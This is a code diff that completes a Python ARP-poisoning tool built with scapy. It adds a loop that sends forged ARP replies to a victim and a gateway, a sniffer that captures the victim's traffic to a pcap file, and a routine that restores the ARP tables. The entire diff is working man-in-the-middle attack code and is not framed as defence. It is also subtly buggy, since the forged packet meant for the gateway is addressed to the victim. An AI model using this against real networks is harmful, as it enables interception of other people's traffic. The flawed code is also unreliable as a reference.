@@ -5,7 +5,7 @@ Description: An arp poisioning tool coded in python.
 """
 
 from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcvm, srp, wrpcap)
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
 
 import os
 import sys
@@ -41,13 +41,71 @@ class Arper:
         self.sniff_thread.start()
 
     def poison(self):
-        pass
+        poison_victem = ARP()
+        poison_victem.op = 2
+        poison_victem.psrc = self.gateway
+        poison_victem.pdst = self.victim
+        poison_victem.hwdst = self.victimmac
+        print(f'ip src: {poison_victem.psrc}')
+        print(f'ip dst: {poison_victem.pdst}')
+        print(f'mac dst: {poison_victem.hwdst}')
+        print(f'mac src: {poison_victem.hwsrc}')
+        print(poison_victem.summary())
+        print('-' * 30)
+
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.pdst = self.victim
+        poison_gateway.hwdst = self.victimmac
+        print(f'ip src: {poison_gateway.psrc}')
+        print(f'ip dst: {poison_gateway.pdst}')
+        print(f'mac dst: {poison_gateway.hwdst}')
+        print(f'mac src: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-' * 30)
+
+        print(f'Beginning the Arp Poison. [CTRL-C to stop]')
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            try:
+                send(poison_victem)
+                send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                self.exit()
+            else:
+                time.sleep(2)
 
     def sniff(self, count=200):
-        pass
+        time.sleep(5)
+        print(f'Sniffing {count} packets')
+        bpf_filter = "ip host %s" %victim
+        packets = sniff(count=count, filter=bpf_filter)
+        wrpcap('arper.pcap', packets)
+        print('Got the packets')
+        self.restore()
+        self.poison_thread.terminate()
+        print('Finished.')
 
     def restore(self):
-        pass
+        print('Restoring Arp Tables...')
+        send(ARP(
+            op=2,
+            psrc=self.gateway,
+            hwsrc=self.gatewaymac,
+            pdst=self.victim,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count = 5)
+        send(ARP(
+            op=2,
+            psrc=self.victim,
+            hwsrc=self.victimmac,
+            pdst=self.gateway,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5)
 
 if __name__ == '__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
